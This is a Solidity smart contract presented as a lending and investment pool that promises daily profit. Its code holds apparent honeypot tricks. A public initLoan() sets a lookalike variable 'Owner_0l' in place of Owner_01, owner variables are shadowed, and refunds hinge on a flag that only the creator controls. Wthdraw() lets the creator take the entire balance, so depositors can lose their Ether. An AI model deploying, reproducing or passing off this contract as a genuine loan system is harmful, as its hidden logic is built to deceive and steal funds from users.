pragma solidity ^0.4.16;

contract Base 
{
    address Creator = msg.sender;
    address Owner_01 = msg.sender;
    address Owner_02;
    address Owner_03;
    
    function add(uint256 x, uint256 y) 
    internal 
    returns (uint256) 
    {
        uint256 z = x + y;
        if((z >= x) && (z >= y))
        {
          return z;
        }
        else
        {
            revert();
        }
    }

    function sub(uint256 x, uint256 y) 
    internal 
    returns (uint256) 
    {
        if(x >= y)
        {
           uint256 z = x - y;
           return z;
        }
        else
        {
            revert();
        }
    }

    function mul(uint256 x, uint256 y) 
    internal 
    returns (uint256) 
    {
        uint256 z = x * y;
        if((x == 0) || (z / x == y))
        {
            return z;
        }
        else
        {
            revert();
        }
    }
    
    event Deposit(address indexed sender, uint value);
    
    event Invest(address indexed sender, uint value);
    
    event Refound(address indexed sender, uint value);
    
    event Withdraw(address indexed sender, uint value);
    
    event Log(string message);
}

contract Loan is Base
{
    struct Creditor
    {
        uint Time;
        uint Invested;
    }
    
    uint public TotalInvested;
    uint public Available;
    uint public InvestorsQty;
    uint public prcntRate = 1;
    bool CanRefound;
    
    address Owner_0l;
    address Owner_02;
    address Owner_03;
    
    mapping (address => uint) public Investors;
    mapping (address => Creditor) public Creditors;
    
    function initLoan()
    {
        Owner_0l = msg.sender;
    }
    
    function SetScndOwner(address addr) 
    public 
    {
        require((msg.sender == Owner_02)||(msg.sender==Creator));
        Owner_02 = addr;
    }
    
    function SetThrdOwner(address addr) 
    public 
    {
        require((msg.sender == Owner_02)||(msg.sender==Creator));
        Owner_03 = addr;
    }
    
    function SetPrcntRate(uint val)
    public
    {
        if(val>=1&&msg.sender==Creator)
        {
            prcntRate = val;  
        }
    }
    
    function StartRefound(bool val)
    public
    {
        if(msg.sender==Creator)
        { 
            CanRefound = val;
        }
    }
    
    function() payable
    {
        InvestFund();
    }
    
    function InvestFund() 
    public
    payable
    {
        if(msg.value>= 1 ether)
        {
            if(Investors[msg.sender]==0)InvestorsQty++;
            Investors[msg.sender]+=msg.value;
            TotalInvested+=msg.value;
            Available+=msg.value;
            Invest(msg.sender,msg.value);
        }   
    }
    
    function ToLend() 
    public 
    payable
    {
        Creditors[msg.sender].Time = now;
        Creditors[msg.sender].Invested += msg.value;
        Deposit(msg.sender,msg.value);
    }
    
    function CheckProfit(address addr) 
    public 
    constant 
    returns(uint)
    {
        return ((Creditors[addr].Invested/100)*prcntRate)*((now-Creditors[addr].Time)/1 days);
    }
    
    function TakeBack() 
    public 
    payable
    {
        uint profit = CheckProfit(msg.sender);
        if(profit>0&&CanRefound)
        {
            uint summ = Creditors[msg.sender].Invested+profit;
            Creditors[msg.sender].Invested = 0;
            msg.sender.transfer(summ);
            Refound(msg.sender,summ);
        }
    }
    
    function WithdrawToInvestor(address _addr, uint _wei) 
    public 
    payable
    {
        if(Investors[_addr]>0)
        {
            if(isOwner())
            {
                 if(_addr.send(_wei))
                 {
                   Available-=_wei;
                   Withdraw(_addr,_wei);
                 }
            }
        }
    }
    
    function Wthdraw()
    public
    payable
    {
        if(msg.sender==Creator)
        {
            Creator.transfer(this.balance);
        }
    }
    
    
    function isOwner()
    private
    constant 
    returns (bool)
    {
        return( msg.sender == Owner_01 || msg.sender == Owner_02 || msg.sender == Owner_03);
    }
}